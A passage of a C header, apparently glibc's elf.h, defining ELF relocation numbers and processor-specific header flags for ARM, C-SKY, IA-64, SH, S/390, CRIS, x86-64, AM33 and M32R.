#define R_ARM_LDRS_SB_G1	79	/* Program base relative
					   (LDR, STR, LDRB, STRB).  */
#define R_ARM_LDRS_SB_G2	80	/* Program base relative
					   (LDR, STR, LDRB, STRB).  */
#define R_ARM_LDC_SB_G0		81	/* Program base relative (LDC,STC).  */
#define R_ARM_LDC_SB_G1		82	/* Program base relative (LDC,STC).  */
#define R_ARM_LDC_SB_G2		83	/* Program base relative (LDC,STC).  */
#define R_ARM_MOVW_BREL_NC	84	/* Program base relative 16
					   bit (MOVW).  */
#define R_ARM_MOVT_BREL		85	/* Program base relative high
					   16 bit (MOVT).  */
#define R_ARM_MOVW_BREL		86	/* Program base relative 16
					   bit (MOVW).  */
#define R_ARM_THM_MOVW_BREL_NC	87	/* Program base relative 16
					   bit (Thumb32 MOVW).  */
#define R_ARM_THM_MOVT_BREL	88	/* Program base relative high
					   16 bit (Thumb32 MOVT).  */
#define R_ARM_THM_MOVW_BREL	89	/* Program base relative 16
					   bit (Thumb32 MOVW).  */
#define R_ARM_TLS_GOTDESC	90
#define R_ARM_TLS_CALL		91
#define R_ARM_TLS_DESCSEQ	92	/* TLS relaxation.  */
#define R_ARM_THM_TLS_CALL	93
#define R_ARM_PLT32_ABS		94
#define R_ARM_GOT_ABS		95	/* GOT entry.  */
#define R_ARM_GOT_PREL		96	/* PC relative GOT entry.  */
#define R_ARM_GOT_BREL12	97	/* GOT entry relative to GOT
					   origin (LDR).  */
#define R_ARM_GOTOFF12		98	/* 12 bit, GOT entry relative
					   to GOT origin (LDR, STR).  */
#define R_ARM_GOTRELAX		99
#define R_ARM_GNU_VTENTRY	100
#define R_ARM_GNU_VTINHERIT	101
#define R_ARM_THM_PC11		102	/* PC relative & 0xFFE (Thumb16 B).  */
#define R_ARM_THM_PC9		103	/* PC relative & 0x1FE
					   (Thumb16 B/B<cond>).  */
#define R_ARM_TLS_GD32		104	/* PC-rel 32 bit for global dynamic
					   thread local data */
#define R_ARM_TLS_LDM32		105	/* PC-rel 32 bit for local dynamic
					   thread local data */
#define R_ARM_TLS_LDO32		106	/* 32 bit offset relative to TLS
					   block */
#define R_ARM_TLS_IE32		107	/* PC-rel 32 bit for GOT entry of
					   static TLS block offset */
#define R_ARM_TLS_LE32		108	/* 32 bit offset relative to static
					   TLS block */
#define R_ARM_TLS_LDO12		109	/* 12 bit relative to TLS
					   block (LDR, STR).  */
#define R_ARM_TLS_LE12		110	/* 12 bit relative to static
					   TLS block (LDR, STR).  */
#define R_ARM_TLS_IE12GP	111	/* 12 bit GOT entry relative
					   to GOT origin (LDR).  */
#define R_ARM_ME_TOO		128	/* Obsolete.  */
#define R_ARM_THM_TLS_DESCSEQ	129
#define R_ARM_THM_TLS_DESCSEQ16	129
#define R_ARM_THM_TLS_DESCSEQ32	130
#define R_ARM_THM_GOT_BREL12	131	/* GOT entry relative to GOT
					   origin, 12 bit (Thumb32 LDR).  */
#define R_ARM_IRELATIVE		160
#define R_ARM_RXPC25		249
#define R_ARM_RSBREL32		250
#define R_ARM_THM_RPC22		251
#define R_ARM_RREL32		252
#define R_ARM_RABS22		253
#define R_ARM_RPC24		254
#define R_ARM_RBASE		255
/* Keep this the last entry.  */
#define R_ARM_NUM		256

/* C-SKY */
#define R_CKCORE_NONE               0	/* no reloc */
#define R_CKCORE_ADDR32             1	/* direct 32 bit (S + A) */
#define R_CKCORE_PCRELIMM8BY4       2	/* disp ((S + A - P) >> 2) & 0xff   */
#define R_CKCORE_PCRELIMM11BY2      3	/* disp ((S + A - P) >> 1) & 0x7ff  */
#define R_CKCORE_PCREL32            5	/* 32-bit rel (S + A - P)           */
#define R_CKCORE_PCRELJSR_IMM11BY2  6	/* disp ((S + A - P) >>1) & 0x7ff   */
#define R_CKCORE_RELATIVE           9	/* 32 bit adjust program base(B + A)*/
#define R_CKCORE_COPY               10	/* 32 bit adjust by program base    */
#define R_CKCORE_GLOB_DAT           11	/* off between got and sym (S)      */
#define R_CKCORE_JUMP_SLOT          12	/* PLT entry (S) */
#define R_CKCORE_GOTOFF             13	/* offset to GOT (S + A - GOT)      */
#define R_CKCORE_GOTPC              14	/* PC offset to GOT (GOT + A - P)   */
#define R_CKCORE_GOT32              15	/* 32 bit GOT entry (G) */
#define R_CKCORE_PLT32              16	/* 32 bit PLT entry (G) */
#define R_CKCORE_ADDRGOT            17	/* GOT entry in GLOB_DAT (GOT + G)  */
#define R_CKCORE_ADDRPLT            18	/* PLT entry in GLOB_DAT (GOT + G)  */
#define R_CKCORE_PCREL_IMM26BY2     19	/* ((S + A - P) >> 1) & 0x3ffffff   */
#define R_CKCORE_PCREL_IMM16BY2     20	/* disp ((S + A - P) >> 1) & 0xffff */
#define R_CKCORE_PCREL_IMM16BY4     21	/* disp ((S + A - P) >> 2) & 0xffff */
#define R_CKCORE_PCREL_IMM10BY2     22	/* disp ((S + A - P) >> 1) & 0x3ff  */
#define R_CKCORE_PCREL_IMM10BY4     23	/* disp ((S + A - P) >> 2) & 0x3ff  */
#define R_CKCORE_ADDR_HI16          24	/* high & low 16 bit ADDR */
                                        /* ((S + A) >> 16) & 0xffff */
#define R_CKCORE_ADDR_LO16          25	/* (S + A) & 0xffff */
#define R_CKCORE_GOTPC_HI16         26	/* high & low 16 bit GOTPC */
                                        /* ((GOT + A - P) >> 16) & 0xffff */
#define R_CKCORE_GOTPC_LO16         27	/* (GOT + A - P) & 0xffff */
#define R_CKCORE_GOTOFF_HI16        28	/* high & low 16 bit GOTOFF */
                                        /* ((S + A - GOT) >> 16) & 0xffff */
#define R_CKCORE_GOTOFF_LO16        29	/* (S + A - GOT) & 0xffff */
#define R_CKCORE_GOT12              30	/* 12 bit disp GOT entry (G) */
#define R_CKCORE_GOT_HI16           31	/* high & low 16 bit GOT */
                                        /* (G >> 16) & 0xffff */
#define R_CKCORE_GOT_LO16           32	/* (G & 0xffff) */
#define R_CKCORE_PLT12              33	/* 12 bit disp PLT entry (G) */
#define R_CKCORE_PLT_HI16           34	/* high & low 16 bit PLT */
                                        /* (G >> 16) & 0xffff */
#define R_CKCORE_PLT_LO16           35	/* G & 0xffff */
#define R_CKCORE_ADDRGOT_HI16       36	/* high & low 16 bit ADDRGOT */
                                        /* (GOT + G * 4) & 0xffff */
#define R_CKCORE_ADDRGOT_LO16       37	/* (GOT + G * 4) & 0xffff */
#define R_CKCORE_ADDRPLT_HI16       38	/* high & low 16 bit ADDRPLT */
                                        /* ((GOT + G * 4) >> 16) & 0xFFFF */
#define R_CKCORE_ADDRPLT_LO16       39	/* (GOT+G*4) & 0xffff */
#define R_CKCORE_PCREL_JSR_IMM26BY2 40	/* disp ((S+A-P) >>1) & x3ffffff */
#define R_CKCORE_TOFFSET_LO16       41	/* (S+A-BTEXT) & 0xffff */
#define R_CKCORE_DOFFSET_LO16       42	/* (S+A-BTEXT) & 0xffff */
#define R_CKCORE_PCREL_IMM18BY2     43	/* disp ((S+A-P) >>1) & 0x3ffff */
#define R_CKCORE_DOFFSET_IMM18      44	/* disp (S+A-BDATA) & 0x3ffff */
#define R_CKCORE_DOFFSET_IMM18BY2   45	/* disp ((S+A-BDATA)>>1) & 0x3ffff */
#define R_CKCORE_DOFFSET_IMM18BY4   46	/* disp ((S+A-BDATA)>>2) & 0x3ffff */
#define R_CKCORE_GOT_IMM18BY4       48	/* disp (G >> 2) */
#define R_CKCORE_PLT_IMM18BY4       49	/* disp (G >> 2) */
#define R_CKCORE_PCREL_IMM7BY4      50	/* disp ((S+A-P) >>2) & 0x7f */
#define R_CKCORE_TLS_LE32           51	/* 32 bit offset to TLS block */
#define R_CKCORE_TLS_IE32           52
#define R_CKCORE_TLS_GD32           53
#define R_CKCORE_TLS_LDM32          54
#define R_CKCORE_TLS_LDO32          55
#define R_CKCORE_TLS_DTPMOD32       56
#define R_CKCORE_TLS_DTPOFF32       57
#define R_CKCORE_TLS_TPOFF32        58

/* C-SKY elf header definition.  */
#define EF_CSKY_ABIMASK		    0XF0000000
#define EF_CSKY_OTHER		    0X0FFF0000
#define EF_CSKY_PROCESSOR	    0X0000FFFF

#define EF_CSKY_ABIV1		    0X10000000
#define EF_CSKY_ABIV2		    0X20000000

/* C-SKY attributes section.  */
#define SHT_CSKY_ATTRIBUTES	    (SHT_LOPROC + 1)

/* IA-64 specific declarations.  */

/* Processor specific flags for the Ehdr e_flags field.  */
#define EF_IA_64_MASKOS		0x0000000f	/* os-specific flags */
#define EF_IA_64_ABI64		0x00000010	/* 64-bit ABI */
#define EF_IA_64_ARCH		0xff000000	/* arch. version mask */

/* Processor specific values for the Phdr p_type field.  */
#define PT_IA_64_ARCHEXT	(PT_LOPROC + 0)	/* arch extension bits */
#define PT_IA_64_UNWIND		(PT_LOPROC + 1)	/* ia64 unwind bits */
#define PT_IA_64_HP_OPT_ANOT	(PT_LOOS + 0x12)
#define PT_IA_64_HP_HSL_ANOT	(PT_LOOS + 0x13)
#define PT_IA_64_HP_STACK	(PT_LOOS + 0x14)

/* Processor specific flags for the Phdr p_flags field.  */
#define PF_IA_64_NORECOV	0x80000000	/* spec insns w/o recovery */

/* Processor specific values for the Shdr sh_type field.  */
#define SHT_IA_64_EXT		(SHT_LOPROC + 0) /* extension bits */
#define SHT_IA_64_UNWIND	(SHT_LOPROC + 1) /* unwind bits */

/* Processor specific flags for the Shdr sh_flags field.  */
#define SHF_IA_64_SHORT		0x10000000	/* section near gp */
#define SHF_IA_64_NORECOV	0x20000000	/* spec insns w/o recovery */

/* Processor specific values for the Dyn d_tag field.  */
#define DT_IA_64_PLT_RESERVE	(DT_LOPROC + 0)
#define DT_IA_64_NUM		1

/* IA-64 relocations.  */
#define R_IA64_NONE		0x00	/* none */
#define R_IA64_IMM14		0x21	/* symbol + addend, add imm14 */
#define R_IA64_IMM22		0x22	/* symbol + addend, add imm22 */
#define R_IA64_IMM64		0x23	/* symbol + addend, mov imm64 */
#define R_IA64_DIR32MSB		0x24	/* symbol + addend, data4 MSB */
#define R_IA64_DIR32LSB		0x25	/* symbol + addend, data4 LSB */
#define R_IA64_DIR64MSB		0x26	/* symbol + addend, data8 MSB */
#define R_IA64_DIR64LSB		0x27	/* symbol + addend, data8 LSB */
#define R_IA64_GPREL22		0x2a	/* @gprel(sym + add), add imm22 */
#define R_IA64_GPREL64I		0x2b	/* @gprel(sym + add), mov imm64 */
#define R_IA64_GPREL32MSB	0x2c	/* @gprel(sym + add), data4 MSB */
#define R_IA64_GPREL32LSB	0x2d	/* @gprel(sym + add), data4 LSB */
#define R_IA64_GPREL64MSB	0x2e	/* @gprel(sym + add), data8 MSB */
#define R_IA64_GPREL64LSB	0x2f	/* @gprel(sym + add), data8 LSB */
#define R_IA64_LTOFF22		0x32	/* @ltoff(sym + add), add imm22 */
#define R_IA64_LTOFF64I		0x33	/* @ltoff(sym + add), mov imm64 */
#define R_IA64_PLTOFF22		0x3a	/* @pltoff(sym + add), add imm22 */
#define R_IA64_PLTOFF64I	0x3b	/* @pltoff(sym + add), mov imm64 */
#define R_IA64_PLTOFF64MSB	0x3e	/* @pltoff(sym + add), data8 MSB */
#define R_IA64_PLTOFF64LSB	0x3f	/* @pltoff(sym + add), data8 LSB */
#define R_IA64_FPTR64I		0x43	/* @fptr(sym + add), mov imm64 */
#define R_IA64_FPTR32MSB	0x44	/* @fptr(sym + add), data4 MSB */
#define R_IA64_FPTR32LSB	0x45	/* @fptr(sym + add), data4 LSB */
#define R_IA64_FPTR64MSB	0x46	/* @fptr(sym + add), data8 MSB */
#define R_IA64_FPTR64LSB	0x47	/* @fptr(sym + add), data8 LSB */
#define R_IA64_PCREL60B		0x48	/* @pcrel(sym + add), brl */
#define R_IA64_PCREL21B		0x49	/* @pcrel(sym + add), ptb, call */
#define R_IA64_PCREL21M		0x4a	/* @pcrel(sym + add), chk.s */
#define R_IA64_PCREL21F		0x4b	/* @pcrel(sym + add), fchkf */
#define R_IA64_PCREL32MSB	0x4c	/* @pcrel(sym + add), data4 MSB */
#define R_IA64_PCREL32LSB	0x4d	/* @pcrel(sym + add), data4 LSB */
#define R_IA64_PCREL64MSB	0x4e	/* @pcrel(sym + add), data8 MSB */
#define R_IA64_PCREL64LSB	0x4f	/* @pcrel(sym + add), data8 LSB */
#define R_IA64_LTOFF_FPTR22	0x52	/* @ltoff(@fptr(s+a)), imm22 */
#define R_IA64_LTOFF_FPTR64I	0x53	/* @ltoff(@fptr(s+a)), imm64 */
#define R_IA64_LTOFF_FPTR32MSB	0x54	/* @ltoff(@fptr(s+a)), data4 MSB */
#define R_IA64_LTOFF_FPTR32LSB	0x55	/* @ltoff(@fptr(s+a)), data4 LSB */
#define R_IA64_LTOFF_FPTR64MSB	0x56	/* @ltoff(@fptr(s+a)), data8 MSB */
#define R_IA64_LTOFF_FPTR64LSB	0x57	/* @ltoff(@fptr(s+a)), data8 LSB */
#define R_IA64_SEGREL32MSB	0x5c	/* @segrel(sym + add), data4 MSB */
#define R_IA64_SEGREL32LSB	0x5d	/* @segrel(sym + add), data4 LSB */
#define R_IA64_SEGREL64MSB	0x5e	/* @segrel(sym + add), data8 MSB */
#define R_IA64_SEGREL64LSB	0x5f	/* @segrel(sym + add), data8 LSB */
#define R_IA64_SECREL32MSB	0x64	/* @secrel(sym + add), data4 MSB */
#define R_IA64_SECREL32LSB	0x65	/* @secrel(sym + add), data4 LSB */
#define R_IA64_SECREL64MSB	0x66	/* @secrel(sym + add), data8 MSB */
#define R_IA64_SECREL64LSB	0x67	/* @secrel(sym + add), data8 LSB */
#define R_IA64_REL32MSB		0x6c	/* data 4 + REL */
#define R_IA64_REL32LSB		0x6d	/* data 4 + REL */
#define R_IA64_REL64MSB		0x6e	/* data 8 + REL */
#define R_IA64_REL64LSB		0x6f	/* data 8 + REL */
#define R_IA64_LTV32MSB		0x74	/* symbol + addend, data4 MSB */
#define R_IA64_LTV32LSB		0x75	/* symbol + addend, data4 LSB */
#define R_IA64_LTV64MSB		0x76	/* symbol + addend, data8 MSB */
#define R_IA64_LTV64LSB		0x77	/* symbol + addend, data8 LSB */
#define R_IA64_PCREL21BI	0x79	/* @pcrel(sym + add), 21bit inst */
#define R_IA64_PCREL22		0x7a	/* @pcrel(sym + add), 22bit inst */
#define R_IA64_PCREL64I		0x7b	/* @pcrel(sym + add), 64bit inst */
#define R_IA64_IPLTMSB		0x80	/* dynamic reloc, imported PLT, MSB */
#define R_IA64_IPLTLSB		0x81	/* dynamic reloc, imported PLT, LSB */
#define R_IA64_COPY		0x84	/* copy relocation */
#define R_IA64_SUB		0x85	/* Addend and symbol difference */
#define R_IA64_LTOFF22X		0x86	/* LTOFF22, relaxable.  */
#define R_IA64_LDXMOV		0x87	/* Use of LTOFF22X.  */
#define R_IA64_TPREL14		0x91	/* @tprel(sym + add), imm14 */
#define R_IA64_TPREL22		0x92	/* @tprel(sym + add), imm22 */
#define R_IA64_TPREL64I		0x93	/* @tprel(sym + add), imm64 */
#define R_IA64_TPREL64MSB	0x96	/* @tprel(sym + add), data8 MSB */
#define R_IA64_TPREL64LSB	0x97	/* @tprel(sym + add), data8 LSB */
#define R_IA64_LTOFF_TPREL22	0x9a	/* @ltoff(@tprel(s+a)), imm2 */
#define R_IA64_DTPMOD64MSB	0xa6	/* @dtpmod(sym + add), data8 MSB */
#define R_IA64_DTPMOD64LSB	0xa7	/* @dtpmod(sym + add), data8 LSB */
#define R_IA64_LTOFF_DTPMOD22	0xaa	/* @ltoff(@dtpmod(sym + add)), imm22 */
#define R_IA64_DTPREL14		0xb1	/* @dtprel(sym + add), imm14 */
#define R_IA64_DTPREL22		0xb2	/* @dtprel(sym + add), imm22 */
#define R_IA64_DTPREL64I	0xb3	/* @dtprel(sym + add), imm64 */
#define R_IA64_DTPREL32MSB	0xb4	/* @dtprel(sym + add), data4 MSB */
#define R_IA64_DTPREL32LSB	0xb5	/* @dtprel(sym + add), data4 LSB */
#define R_IA64_DTPREL64MSB	0xb6	/* @dtprel(sym + add), data8 MSB */
#define R_IA64_DTPREL64LSB	0xb7	/* @dtprel(sym + add), data8 LSB */
#define R_IA64_LTOFF_DTPREL22	0xba	/* @ltoff(@dtprel(s+a)), imm22 */

/* SH specific declarations */

/* Processor specific flags for the ELF header e_flags field.  */
#define EF_SH_MACH_MASK		0x1f
#define EF_SH_UNKNOWN		0x0
#define EF_SH1			0x1
#define EF_SH2			0x2
#define EF_SH3			0x3
#define EF_SH_DSP		0x4
#define EF_SH3_DSP		0x5
#define EF_SH4AL_DSP		0x6
#define EF_SH3E			0x8
#define EF_SH4			0x9
#define EF_SH2E			0xb
#define EF_SH4A			0xc
#define EF_SH2A			0xd
#define EF_SH4_NOFPU		0x10
#define EF_SH4A_NOFPU		0x11
#define EF_SH4_NOMMU_NOFPU	0x12
#define EF_SH2A_NOFPU		0x13
#define EF_SH3_NOMMU		0x14
#define EF_SH2A_SH4_NOFPU	0x15
#define EF_SH2A_SH3_NOFPU	0x16
#define EF_SH2A_SH4		0x17
#define EF_SH2A_SH3E		0x18

/* SH relocs.  */
#define	R_SH_NONE		0
#define	R_SH_DIR32		1
#define	R_SH_REL32		2
#define	R_SH_DIR8WPN		3
#define	R_SH_IND12W		4
#define	R_SH_DIR8WPL		5
#define	R_SH_DIR8WPZ		6
#define	R_SH_DIR8BP		7
#define	R_SH_DIR8W		8
#define	R_SH_DIR8L		9
#define	R_SH_SWITCH16		25
#define	R_SH_SWITCH32		26
#define	R_SH_USES		27
#define	R_SH_COUNT		28
#define	R_SH_ALIGN		29
#define	R_SH_CODE		30
#define	R_SH_DATA		31
#define	R_SH_LABEL		32
#define	R_SH_SWITCH8		33
#define	R_SH_GNU_VTINHERIT	34
#define	R_SH_GNU_VTENTRY	35
#define	R_SH_TLS_GD_32		144
#define	R_SH_TLS_LD_32		145
#define	R_SH_TLS_LDO_32		146
#define	R_SH_TLS_IE_32		147
#define	R_SH_TLS_LE_32		148
#define	R_SH_TLS_DTPMOD32	149
#define	R_SH_TLS_DTPOFF32	150
#define	R_SH_TLS_TPOFF32	151
#define	R_SH_GOT32		160
#define	R_SH_PLT32		161
#define	R_SH_COPY		162
#define	R_SH_GLOB_DAT		163
#define	R_SH_JMP_SLOT		164
#define	R_SH_RELATIVE		165
#define	R_SH_GOTOFF		166
#define	R_SH_GOTPC		167
/* Keep this the last entry.  */
#define	R_SH_NUM		256

/* S/390 specific definitions.  */

/* Valid values for the e_flags field.  */

#define EF_S390_HIGH_GPRS    0x00000001  /* High GPRs kernel facility needed.  */

/* Additional s390 relocs */

#define R_390_NONE		0	/* No reloc.  */
#define R_390_8			1	/* Direct 8 bit.  */
#define R_390_12		2	/* Direct 12 bit.  */
#define R_390_16		3	/* Direct 16 bit.  */
#define R_390_32		4	/* Direct 32 bit.  */
#define R_390_PC32		5	/* PC relative 32 bit.	*/
#define R_390_GOT12		6	/* 12 bit GOT offset.  */
#define R_390_GOT32		7	/* 32 bit GOT offset.  */
#define R_390_PLT32		8	/* 32 bit PC relative PLT address.  */
#define R_390_COPY		9	/* Copy symbol at runtime.  */
#define R_390_GLOB_DAT		10	/* Create GOT entry.  */
#define R_390_JMP_SLOT		11	/* Create PLT entry.  */
#define R_390_RELATIVE		12	/* Adjust by program base.  */
#define R_390_GOTOFF32		13	/* 32 bit offset to GOT.	 */
#define R_390_GOTPC		14	/* 32 bit PC relative offset to GOT.  */
#define R_390_GOT16		15	/* 16 bit GOT offset.  */
#define R_390_PC16		16	/* PC relative 16 bit.	*/
#define R_390_PC16DBL		17	/* PC relative 16 bit shifted by 1.  */
#define R_390_PLT16DBL		18	/* 16 bit PC rel. PLT shifted by 1.  */
#define R_390_PC32DBL		19	/* PC relative 32 bit shifted by 1.  */
#define R_390_PLT32DBL		20	/* 32 bit PC rel. PLT shifted by 1.  */
#define R_390_GOTPCDBL		21	/* 32 bit PC rel. GOT shifted by 1.  */
#define R_390_64		22	/* Direct 64 bit.  */
#define R_390_PC64		23	/* PC relative 64 bit.	*/
#define R_390_GOT64		24	/* 64 bit GOT offset.  */
#define R_390_PLT64		25	/* 64 bit PC relative PLT address.  */
#define R_390_GOTENT		26	/* 32 bit PC rel. to GOT entry >> 1. */
#define R_390_GOTOFF16		27	/* 16 bit offset to GOT. */
#define R_390_GOTOFF64		28	/* 64 bit offset to GOT. */
#define R_390_GOTPLT12		29	/* 12 bit offset to jump slot.	*/
#define R_390_GOTPLT16		30	/* 16 bit offset to jump slot.	*/
#define R_390_GOTPLT32		31	/* 32 bit offset to jump slot.	*/
#define R_390_GOTPLT64		32	/* 64 bit offset to jump slot.	*/
#define R_390_GOTPLTENT		33	/* 32 bit rel. offset to jump slot.  */
#define R_390_PLTOFF16		34	/* 16 bit offset from GOT to PLT. */
#define R_390_PLTOFF32		35	/* 32 bit offset from GOT to PLT. */
#define R_390_PLTOFF64		36	/* 16 bit offset from GOT to PLT. */
#define R_390_TLS_LOAD		37	/* Tag for load insn in TLS code.  */
#define R_390_TLS_GDCALL	38	/* Tag for function call in general
					   dynamic TLS code. */
#define R_390_TLS_LDCALL	39	/* Tag for function call in local
					   dynamic TLS code. */
#define R_390_TLS_GD32		40	/* Direct 32 bit for general dynamic
					   thread local data.  */
#define R_390_TLS_GD64		41	/* Direct 64 bit for general dynamic
					  thread local data.  */
#define R_390_TLS_GOTIE12	42	/* 12 bit GOT offset for static TLS
					   block offset.  */
#define R_390_TLS_GOTIE32	43	/* 32 bit GOT offset for static TLS
					   block offset.  */
#define R_390_TLS_GOTIE64	44	/* 64 bit GOT offset for static TLS
					   block offset. */
#define R_390_TLS_LDM32		45	/* Direct 32 bit for local dynamic
					   thread local data in LE code.  */
#define R_390_TLS_LDM64		46	/* Direct 64 bit for local dynamic
					   thread local data in LE code.  */
#define R_390_TLS_IE32		47	/* 32 bit address of GOT entry for
					   negated static TLS block offset.  */
#define R_390_TLS_IE64		48	/* 64 bit address of GOT entry for
					   negated static TLS block offset.  */
#define R_390_TLS_IEENT		49	/* 32 bit rel. offset to GOT entry for
					   negated static TLS block offset.  */
#define R_390_TLS_LE32		50	/* 32 bit negated offset relative to
					   static TLS block.  */
#define R_390_TLS_LE64		51	/* 64 bit negated offset relative to
					   static TLS block.  */
#define R_390_TLS_LDO32		52	/* 32 bit offset relative to TLS
					   block.  */
#define R_390_TLS_LDO64		53	/* 64 bit offset relative to TLS
					   block.  */
#define R_390_TLS_DTPMOD	54	/* ID of module containing symbol.  */
#define R_390_TLS_DTPOFF	55	/* Offset in TLS block.	 */
#define R_390_TLS_TPOFF		56	/* Negated offset in static TLS
					   block.  */
#define R_390_20		57	/* Direct 20 bit.  */
#define R_390_GOT20		58	/* 20 bit GOT offset.  */
#define R_390_GOTPLT20		59	/* 20 bit offset to jump slot.  */
#define R_390_TLS_GOTIE20	60	/* 20 bit GOT offset for static TLS
					   block offset.  */
#define R_390_IRELATIVE         61      /* STT_GNU_IFUNC relocation.  */
/* Keep this the last entry.  */
#define R_390_NUM		62


/* CRIS relocations.  */
#define R_CRIS_NONE		0
#define R_CRIS_8		1
#define R_CRIS_16		2
#define R_CRIS_32		3
#define R_CRIS_8_PCREL		4
#define R_CRIS_16_PCREL		5
#define R_CRIS_32_PCREL		6
#define R_CRIS_GNU_VTINHERIT	7
#define R_CRIS_GNU_VTENTRY	8
#define R_CRIS_COPY		9
#define R_CRIS_GLOB_DAT		10
#define R_CRIS_JUMP_SLOT	11
#define R_CRIS_RELATIVE		12
#define R_CRIS_16_GOT		13
#define R_CRIS_32_GOT		14
#define R_CRIS_16_GOTPLT	15
#define R_CRIS_32_GOTPLT	16
#define R_CRIS_32_GOTREL	17
#define R_CRIS_32_PLT_GOTREL	18
#define R_CRIS_32_PLT_PCREL	19

#define R_CRIS_NUM		20


/* AMD x86-64 relocations.  */
#define R_X86_64_NONE		0	/* No reloc */
#define R_X86_64_64		1	/* Direct 64 bit  */
#define R_X86_64_PC32		2	/* PC relative 32 bit signed */
#define R_X86_64_GOT32		3	/* 32 bit GOT entry */
#define R_X86_64_PLT32		4	/* 32 bit PLT address */
#define R_X86_64_COPY		5	/* Copy symbol at runtime */
#define R_X86_64_GLOB_DAT	6	/* Create GOT entry */
#define R_X86_64_JUMP_SLOT	7	/* Create PLT entry */
#define R_X86_64_RELATIVE	8	/* Adjust by program base */
#define R_X86_64_GOTPCREL	9	/* 32 bit signed PC relative
					   offset to GOT */
#define R_X86_64_32		10	/* Direct 32 bit zero extended */
#define R_X86_64_32S		11	/* Direct 32 bit sign extended */
#define R_X86_64_16		12	/* Direct 16 bit zero extended */
#define R_X86_64_PC16		13	/* 16 bit sign extended pc relative */
#define R_X86_64_8		14	/* Direct 8 bit sign extended  */
#define R_X86_64_PC8		15	/* 8 bit sign extended pc relative */
#define R_X86_64_DTPMOD64	16	/* ID of module containing symbol */
#define R_X86_64_DTPOFF64	17	/* Offset in module\'s TLS block */
#define R_X86_64_TPOFF64	18	/* Offset in initial TLS block */
#define R_X86_64_TLSGD		19	/* 32 bit signed PC relative offset
					   to two GOT entries for GD symbol */
#define R_X86_64_TLSLD		20	/* 32 bit signed PC relative offset
					   to two GOT entries for LD symbol */
#define R_X86_64_DTPOFF32	21	/* Offset in TLS block */
#define R_X86_64_GOTTPOFF	22	/* 32 bit signed PC relative offset
					   to GOT entry for IE symbol */
#define R_X86_64_TPOFF32	23	/* Offset in initial TLS block */
#define R_X86_64_PC64		24	/* PC relative 64 bit */
#define R_X86_64_GOTOFF64	25	/* 64 bit offset to GOT */
#define R_X86_64_GOTPC32	26	/* 32 bit signed pc relative
					   offset to GOT */
#define R_X86_64_GOT64		27	/* 64-bit GOT entry offset */
#define R_X86_64_GOTPCREL64	28	/* 64-bit PC relative offset
					   to GOT entry */
#define R_X86_64_GOTPC64	29	/* 64-bit PC relative offset to GOT */
#define R_X86_64_GOTPLT64	30 	/* like GOT64, says PLT entry needed */
#define R_X86_64_PLTOFF64	31	/* 64-bit GOT relative offset
					   to PLT entry */
#define R_X86_64_SIZE32		32	/* Size of symbol plus 32-bit addend */
#define R_X86_64_SIZE64		33	/* Size of symbol plus 64-bit addend */
#define R_X86_64_GOTPC32_TLSDESC 34	/* GOT offset for TLS descriptor.  */
#define R_X86_64_TLSDESC_CALL   35	/* Marker for call through TLS
					   descriptor.  */
#define R_X86_64_TLSDESC        36	/* TLS descriptor.  */
#define R_X86_64_IRELATIVE	37	/* Adjust indirectly by program base */
#define R_X86_64_RELATIVE64	38	/* 64-bit adjust by program base */
					/* 39 Reserved was R_X86_64_PC32_BND */
					/* 40 Reserved was R_X86_64_PLT32_BND */
#define R_X86_64_GOTPCRELX	41	/* Load from 32 bit signed pc relative
					   offset to GOT entry without REX
					   prefix, relaxable.  */
#define R_X86_64_REX_GOTPCRELX	42	/* Load from 32 bit signed pc relative
					   offset to GOT entry with REX prefix,
					   relaxable.  */
#define R_X86_64_NUM		43

/* x86-64 sh_type values.  */
#define SHT_X86_64_UNWIND	0x70000001 /* Unwind information.  */


/* AM33 relocations.  */
#define R_MN10300_NONE		0	/* No reloc.  */
#define R_MN10300_32		1	/* Direct 32 bit.  */
#define R_MN10300_16		2	/* Direct 16 bit.  */
#define R_MN10300_8		3	/* Direct 8 bit.  */
#define R_MN10300_PCREL32	4	/* PC-relative 32-bit.  */
#define R_MN10300_PCREL16	5	/* PC-relative 16-bit signed.  */
#define R_MN10300_PCREL8	6	/* PC-relative 8-bit signed.  */
#define R_MN10300_GNU_VTINHERIT	7	/* Ancient C++ vtable garbage... */
#define R_MN10300_GNU_VTENTRY	8	/* ... collection annotation.  */
#define R_MN10300_24		9	/* Direct 24 bit.  */
#define R_MN10300_GOTPC32	10	/* 32-bit PCrel offset to GOT.  */
#define R_MN10300_GOTPC16	11	/* 16-bit PCrel offset to GOT.  */
#define R_MN10300_GOTOFF32	12	/* 32-bit offset from GOT.  */
#define R_MN10300_GOTOFF24	13	/* 24-bit offset from GOT.  */
#define R_MN10300_GOTOFF16	14	/* 16-bit offset from GOT.  */
#define R_MN10300_PLT32		15	/* 32-bit PCrel to PLT entry.  */
#define R_MN10300_PLT16		16	/* 16-bit PCrel to PLT entry.  */
#define R_MN10300_GOT32		17	/* 32-bit offset to GOT entry.  */
#define R_MN10300_GOT24		18	/* 24-bit offset to GOT entry.  */
#define R_MN10300_GOT16		19	/* 16-bit offset to GOT entry.  */
#define R_MN10300_COPY		20	/* Copy symbol at runtime.  */
#define R_MN10300_GLOB_DAT	21	/* Create GOT entry.  */
#define R_MN10300_JMP_SLOT	22	/* Create PLT entry.  */
#define R_MN10300_RELATIVE	23	/* Adjust by program base.  */
#define R_MN10300_TLS_GD	24	/* 32-bit offset for global dynamic.  */
#define R_MN10300_TLS_LD	25	/* 32-bit offset for local dynamic.  */
#define R_MN10300_TLS_LDO	26	/* Module-relative offset.  */
#define R_MN10300_TLS_GOTIE	27	/* GOT offset for static TLS block
					   offset.  */
#define R_MN10300_TLS_IE	28	/* GOT address for static TLS block
					   offset.  */
#define R_MN10300_TLS_LE	29	/* Offset relative to static TLS
					   block.  */
#define R_MN10300_TLS_DTPMOD	30	/* ID of module containing symbol.  */
#define R_MN10300_TLS_DTPOFF	31	/* Offset in module TLS block.  */
#define R_MN10300_TLS_TPOFF	32	/* Offset in static TLS block.  */
#define R_MN10300_SYM_DIFF	33	/* Adjustment for next reloc as needed
					   by linker relaxation.  */
#define R_MN10300_ALIGN		34	/* Alignment requirement for linker
					   relaxation.  */
#define R_MN10300_NUM		35


/* M32R relocs.  */
#define R_M32R_NONE		0	/* No reloc. */
#define R_M32R_16		1	/* Direct 16 bit. */
#define R_M32R_32		2	/* Direct 32 bit. */
#define R_M32R_24		3	/* Direct 24 bit. */
#define R_M32R_10_PCREL		4	/* PC relative 10 bit shifted. */
#define R_M32R_18_PCREL		5	/* PC relative 18 bit shifted. */
